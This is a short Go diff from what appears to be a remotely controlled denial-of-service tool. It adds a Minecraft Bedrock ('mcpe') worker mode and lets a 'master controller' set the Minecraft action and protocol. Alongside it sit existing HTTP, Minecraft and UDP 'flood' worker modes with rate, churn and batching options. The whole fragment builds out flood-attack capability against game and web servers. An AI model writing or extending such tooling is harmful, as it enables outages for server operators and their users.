@@ -353,6 +353,22 @@ func runTask(ctx context.Context, cfg TaskConfig) {
 	lim := newLimiter(cfg.Rate)
 	var wg sync.WaitGroup
 
+	// 应用主控下发的 Minecraft 子动作/协议号
+	if cfg.MCAction != "" {
+		if cfg.Mode == "mc" {
+			*mcAction = cfg.MCAction
+		} else if cfg.Mode == "mcpe" {
+			*mcpeAction = cfg.MCAction
+		}
+	}
+	if cfg.MCProtocol > 0 {
+		if cfg.Mode == "mc" {
+			*mcProtocol = cfg.MCProtocol
+		} else if cfg.Mode == "mcpe" {
+			*mcpeProtocol = cfg.MCProtocol
+		}
+	}
+
 	n := cfg.Workers
 	if n <= 0 {
 		n = runtime.NumCPU() * 4
@@ -380,6 +396,8 @@ func runTask(ctx context.Context, cfg TaskConfig) {
 			go httpWorker(ctx, &wg, i, lim)
 		case "mc":
 			go mcWorker(ctx, &wg, i)
+		case "mcpe":
+			go mcpeWorker(ctx, &wg, i)
 		case "flood":
 			if *floodProto == "udp" {
 				if !*floodChurn && *floodBatch > 1 {
